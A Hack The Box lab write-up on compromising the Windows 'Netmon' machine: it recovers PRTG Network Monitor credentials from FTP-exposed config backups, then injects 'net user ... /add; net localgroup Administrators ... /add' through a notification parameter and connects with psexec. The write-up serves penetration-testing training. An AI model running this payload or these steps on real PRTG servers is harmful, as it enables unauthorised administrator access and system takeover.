---
layout: post
title:  "Netmon Writeup - Hack The Box"
date:   2025-05-16
desc: ""
keywords: "HTB,OSCP,eWPT,eJPT,Windows,FTP,Information Leakage,PRTG Network Monitor,Easy"
categories: [HTB]
tags: [HTB,OSCP,eWPT,eJPT,Windows,FTP,Information Leakage,PRTG Network Monitor,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

This is a machine that is a clear example, that the qualification does not seem to me accurate since it is considered **Easy** but to me it was at least **Medium**. Although the whole engagement of the box is to gain access, I still consider that without the necessary skills it becomes hard to break into. The fact that the **Netmon** box is **Windows** is another factor that gets me, as it has become a fascination for me to deal with this **OS**. I'm going to spawn the box in **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** and start this wonderful lab.

<br /><br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After checking my connectivity to the lab with `ping` and using **[Hack4u's](https://hack4u.io/){:target="_blank"}** `whichSystem.py` script to verify the machine's **OS**, I can start my **Reconnaissance** phase. With `nmap` I get the list of ports I have available to look for information about their services and versions, this way I can get an idea of the possible attack vectors. The most striking thing is that the **FTP** service has **anonymous** authentication enabled. There is another excellent tool from **[Hack4u](https://hack4u.io/){:target="_blank"}**, which allows port scanning in a very efficient way, **[`fastTCPScan.go`](https://s4vitar.github.io/fasttcpscan-go/#){:target="_blank"}**. I download the source code, compile it with `go`, compress it with `upx` and I can use it in this and the next labs (I only need to add it to my **PATH**).

```bash
ping -c 1 10.10.10.152
whichSystem.py 10.10.10.152
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.152 -oG allPorts
nmap -sCV -p21,80,135,139,445,5985,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN targeted
cat targeted
# ftp-anon: Anonymous FTP login allowed

nvim fastTCPScan.go
cat fastTCPScan.go | head -n 10
go build -ldflags '-s -w' ./fastTCPScan.go
du -hc fastTCPScan
upx fastTCPScan
./fastTCPScan -h
# :)
nvim ~/.zshrc
cat ~/.zshrc | grep "export PATH"
fastTCPScan -h
fastTCPScan -host 10.10.10.152 -threads 200
# Faster !! :)
```

<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As I can connect with `ftp` without needing a password, I have access to information, but it turns out to be of the whole target system, so first I will investigate the **HTTP** service available on port **80**. With `whatweb` I get very valuable information about the available tool and its version (**PRTG 18.1.37.13946**), **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** does not leak me any more information. If I now search with `searchsploit` I find two exploits for this software but I need to be authenticated and the default credentials (**prtgadmin**:**prtgadmin**) do not work.

> **[PRTG](https://www.paessler.com/prtg){:target="_blank"}** is a unified monitoring tool that can monitor almost any object that has an **IP** address. It consists of the **PRTG core server** and one or more probes: The PRTG core server is responsible for configuration, data management, PRTG web server, and more. Probes collect data and monitor processes on devices via sensors.

```bash
ftp 10.10.10.152 21
# Lots of information to analyze :(

whatweb http://10.10.10.152

searchsploit PRTG 18
# windows/webapps/46527.sh      Authenticated   :(
```

<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As there are many files and folders to investigate when accessing with `ftp`, so I better **[create a mount with curlftps](https://linuxconfig.org/mount-remote-ftp-directory-host-locally-into-linux-filesystem){:target="_blank"}** and search for files that are related to **PRTG**. I succeed in my search and find some available paths, but unfortunately then I have problems to access from my file system, so I use `ftp` again, and in the hidden folder ***.ProgramData*** I find some configuration files and their backups that I am going to download on my machine to analyze them.


```bash
mkdir /mnt/ftpNetmonServer
curlftpfs anonymous:@10.10.10.152 /mnt/ftpNetmonServer

find . \-name \*PRTG\* 2>/dev/null

ftp 10.10.10.152 21
  cd .ProgramData
  cd Paessler
  cd "PRTG Network Monitor"
  prompt off
  mget "PRTG Configuration.dat"
  mget "PRTG Configuration.old"
  mget "PRTG Configuration.old.bak"
  quit
```

<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After comparing the original files with their backups using `diff`, I find the **PRTG** access credentials. 

```bash
diff "PRTG Configuration.dat" "PRTG Configuration.old"
diff "PRTG Configuration.dat" "PRTG Configuration.old.bak"
diff "PRTG Configuration.old" "PRTG Configuration.old.bak"
# User: prtgadmin Pr----2018       :)
```

<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The credentials I found do not allow me to access the **PRTG** dashboard, but something strange I find in the password pattern is that in the last 4 digits maybe correspond to the **year**, so if I modify the last digit to match the year of release of the box and try again I can now access. I remember an exploit that `searchsploit` had shown me and it allows to exploit a **RCE**, so I analyze it and get the **CVE** of the vulnerability and the functions that the script has defined to perform the attack, it is time to do some reversing.

```bash
# http://10.10.10.152/index.htm
# prtgadmin:Pr----2018             :(
# prtgadmin:Pr----2019             :)

searchsploit PRTG 18
searchsploit -x windows/webapps/46527.sh
```

<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Analyzing the code to find out how it exploits the vulnerability is a job that takes me a bit of time, concentration and a lot of deduction, it is always a trial and error task for me. From the code I get certain data, such as the **URL** and the value of the ***tabid*** (**1**) that many times are the functionalities available in a **Dashboard**. Then I resort to **[CyberChef](https://gchq.github.io/CyberChef/){:target="_blank"}** to decode the rest of the function code that is **URL encoded**, so I can know the name of the parameter where the malicious command is most likely being injected. From the **Dashboard**, after browsing for a while and analyzing the ***tabid*** values (by hovering) I find the functionality used as an attack vector. I try to create a new notification and I can see that there is a **checkbox** that allows to execute a program, if I enable it new fields are displayed and one of them corresponds to the one I had found in the exploit code.

```html
http://10.10.10.152/welcome.htm
# --> (1) path: /myaccount.htm?tabid=2
# --> (2) address_10=Demo EXE Notification - OutFile.ps1
# --> (3) message_10="C:\Users\Public\tester.txt;net user pentest P3nT3st!
# - Execute Program!!!!                 Suspicius!!!!
```

<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As I already have an idea of how the exploitation of the vulnerability is performed, I will focus my attention on the function in charge of creating a user (I deduce that in the compromised system). So I'm going to decode the code again with **[CyberChef](https://gchq.github.io/CyberChef/){:target="_blank"}**, and find the names of the parameters that are linked to the fields of the form to create a notification, most likely. I analyze the source code in the browser and if they correspond to what I found in the exploit, it's time to try the attack. I just have to create a new **Notification**, and select the type of file to be generated (***Program File*** field) and the malicious command in the ***Parameter*** field, then save and I can observe the created notification.

```bash
http://10.10.10.152/welcome.htm
# - Program File: Demo EXE Notification - OutFile.ps1   (combobox)
# - C:\Users\Public\tester.txt;net user old_b0y oldboy123!$ /add; net localgroup Administrators old_b0y /add
```

<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The next step is to send the notification and the software informs me that the notification has been triggered and is in the queue. From my machine I can corroborate with `crackmapexec` if the account already exists in the system, and yes it was created, it also informs me that the account could allow me to access through **WinRM**. As port **5985** of the WinRM protocol is enabled I try to connect with `evil-winrm` but I have no problems to do it so I resort to `impacket-psexec` and this time I succeed. I can now access both flags to enter the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, machine finished.

> **[PsExec](https://www.silverfort.com/glossary/psexec/){:target="_blank"}** is a command-line tool that allows users to run programs on remote systems. It can be used to execute remote commands, scripts, and applications on remote systems, as well as to launch GUI-based applications on remote systems.

> **Attacker Machine**:

```bash
crackmapexec smb 10.10.10.152 -u old_b0y -p 'oldboy123!$'
# :)
cat ../nmap/targeted | grep 5985
crackmapexec winrm 10.10.10.152 -u old_b0y -p 'oldboy123!$'
# :)
evil-winrm -i 10.10.10.152 -u old_b0y -p oldboy123'oldboy123!$'
# :(

impacket-psexec WORKGROUP/old_b0y@10.10.10.152 cmd.exe
```

> **Victime Machine**:

```cmd
dir /s user.txt
dir /s root.txt
```

<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Although I could have exploited the machine using the exploit directly from my **Shell**, it is much better to analyze the code to perform the exploitation manually, as it is a good practice and even **safer** because one does not know what an exploit does in background. Also this way I practice and improve my deduction, reversing and lateral thinking skills. Windows machines are awesome to exploit, and **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** always gives me the best labs. I kill the box and I'm already thinking about the new target.

<br /><br />
<img src="{{ site.img_path }}/netmon_writeup/Netmon_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
